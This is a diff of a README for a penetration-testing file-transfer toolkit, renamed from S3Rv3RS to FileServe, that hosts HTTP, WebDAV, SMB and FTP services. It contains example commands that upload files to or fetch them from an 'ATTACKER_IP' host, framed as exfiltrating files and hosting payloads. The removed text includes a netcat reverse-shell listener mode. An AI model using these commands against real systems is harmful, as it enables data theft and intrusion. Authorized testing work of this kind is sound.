@@ -1,52 +1,40 @@
-# S3Rv3RS
+# FileServe
 
-**S3Rv3RS** is a lightweight file-transfer toolkit designed for **penetration testing, CTFs, and lab environments**.
-It provides quick ways to **host files, receive uploads, share files via SMB, or listen for shells** using a single script.
+**FileServe** is a lightweight **file transfer toolkit for red teamers, penetration testers, and CTF players**.
 
-The goal is to simplify common tasks during engagements such as:
+It allows you to quickly spin up multiple file transfer services such as:
 
-* Hosting tools for a compromised machine
-* Exfiltrating files from a target
-* Transferring binaries in Windows environments
-* Setting up quick listeners
+* HTTP download server
+* WebDAV upload server
+* SMB share
+* FTP server
+* Simple upload server
 
-The script automatically installs required dependencies and supports multiple transfer methods.
+The goal is to provide **one command to quickly transfer files during engagements**.
 
 ---
 
 # Features
 
-* **Nginx WebDAV Server**
-  Upload and download files using HTTP/HTTPS.
-
-* **Python HTTP Server**
-  Quickly host files for download.
-
-* **SMB File Share (Impacket)**
-  Useful for Windows targets.
-
-* **Netcat Listener**
-  Simple reverse shell listener.
-
-* **HTTPS Support**
-  Generate a temporary self-signed certificate for encrypted transfers.
-
-* **Automatic Dependency Installation**
-
+* Quick file hosting
+* Multiple transfer methods
+* Optional authentication
+* Automatic dependency installation
+* Auto IP detection
+* Built for **CTF / Red Team operations**
+* Simple command interface
 
 ---
 
-# Requirements
+# Supported Transfer Modes
 
-The script will automatically install these packages if they are missing:
-
-* nginx
-* python3
-* python3-pip
-* openssl
-* netcat-openbsd
-* curl
-* impacket (Python library)
+| Mode         | Description                         |
+| ------------ | ----------------------------------- |
+| `--nginx`    | WebDAV server for upload & download |
+| `--smb`      | Impacket SMB share                  |
+| `--download` | Python HTTP file server             |
+| `--upload`   | Python upload server                |
+| `--ftp`      | Python FTP server                   |
 
 ---
 
@@ -55,99 +43,169 @@ The script will automatically install these packages if they are missing:
 Clone the repository:
 
 ```bash
-git clone https://github.com/4m3rr0r/S3Rv3RS.git
-cd S3Rv3RS
-chmod +x S3Rv3RS
-sudo mv S3Rv3RS /usr/local/bin/
+git clone https://github.com/4m3rr0r/FileServe.git
+cd FileServe
+chmod +x FileServe
+sudo mv fileserve /usr/local/bin/
 ```
+
+Run:
+
+```bash
+./fileserve.sh --help
+```
+
+The script will automatically install required dependencies.
 
 ---
 
 # Usage
 
-```bash
-S3Rv3RS [MODE] [OPTIONS]
+```
+FileServe - File Transfer Toolkit
+
+Usage:
+FileServe [MODE] [OPTIONS]
 ```
 
-## Modes
+### Modes
 
-| Mode               | Description                                   |
-| ------------------ | --------------------------------------------- |
-| `-n`, `--nginx`    | Start Nginx WebDAV server (upload + download) |
-| `-s`, `--smb`      | Start SMB share using Impacket                |
-| `-d`, `--download` | Start Python HTTP server                      |
-| `-c`, `--netcat`   | Start Netcat listener                         |
+```
+-n, --nginx      Nginx WebDAV (Upload + Download)
+-s, --smb        SMB Share
+-d, --download   Python HTTP Download Server
+-u, --upload     Python Upload Server
+-f, --ftp        Python FTP Server
+```
 
----
+### Options
 
-## Options
-
-| Option         | Description                 |
-| -------------- | --------------------------- |
-| `--ssl`        | Enable HTTPS for Nginx mode |
-| `-p`, `--port` | Specify custom port         |
-| `-h`, `--help` | Show help menu              |
+```
+--ssl            Enable HTTPS for Nginx mode
+-p, --port       Custom port
+-U, --user       Username
+-P, --pass       Password
+-h, --help       Show help menu
+```
 
 ---
 
 # Examples
 
-### Start HTTP WebDAV server
+## Start HTTP Download Server
 
 ```bash
-S3Rv3RS -n
+./fileserve.sh -d 
 ```
 
-### Start HTTPS WebDAV server
+Client:
 
 ```bash
-S3Rv3RS -n --ssl
-```
-
-### Start SMB share
-
-```bash
-S3Rv3RS -s
-```
-
-### Start Python file server
-
-```bash
-S3Rv3RS -d
-```
-
-### Start Netcat listener
-
-```bash
-S3Rv3RS -c
+wget http://ATTACKER_IP:8000/file.txt
 ```
 
 ---
 
-# Example File Transfers
+# SMB Share
 
-## Upload file using curl (Linux)
+```bash
+./fileserve.sh --smb
+```
+
+Windows:
+
+```
+copy \\ATTACKER_IP\share\file.exe C:\Temp\file.exe
+```
+
+Mount share:
+
+```
+net use D: \\ATTACKER_IP\share
+```
+
+---
+
+# WebDAV Upload Server
+
+```bash
+./fileserve.sh --nginx
+```
+
+Upload from Linux:
 
 ```bash
 curl -T file.txt http://ATTACKER_IP:9001/upload/file.txt
 ```
 
-## Upload file using PowerShell
+---
 
-```powershell
-(New-Object System.Net.WebClient).UploadFile('http://ATTACKER_IP:9001/upload/file.txt','PUT','file.txt')
+# Upload Server
+
+```bash
+./fileserve.sh --upload
 ```
 
-## Download file from SMB share (Windows)
+Upload file:
 
-```cmd
-copy \\ATTACKER_IP\share\file.exe C:\temp\file.exe
+```bash
+curl -X POST http://ATTACKER_IP:8080/upload -F 'files=@file.txt'
 ```
 
 ---
 
-# Notes
+# FTP Server
 
-* The Nginx server uses a temporary configuration and logs stored in `/tmp`.
-* Files uploaded via WebDAV are saved in the current working directory.
-* HTTPS mode generates a temporary self-signed certificate.
+```bash
+./fileserve.sh --ftp
+```
+
+Upload:
+
+```bash
+curl -T file.txt ftp://ATTACKER_IP:2121/
+```
+
+---
+
+# Authentication
+
+You can enable authentication with:
+
+```bash
+./fileserve.sh --ftp -U user -P pass
+```
+
+---
+
+# Why FileServe?
+
+During CTFs and red team engagements you often need to:
+
+* transfer tools
+* exfiltrate files
+* host payloads
+* bypass restrictions
+
+FileServe provides **multiple transfer options in one toolkit**.
+
+---
+
+# Dependencies
+
+Automatically installed if missing:
+
+* nginx
+* python3
+* python3-pip
+* impacket
+* pyftpdlib
+* uploadserver
+
+---
+
+# Disclaimer
+
+This tool is intended for **educational purposes, security research, and authorized penetration testing only**.
+
+Do not use it against systems without permission.
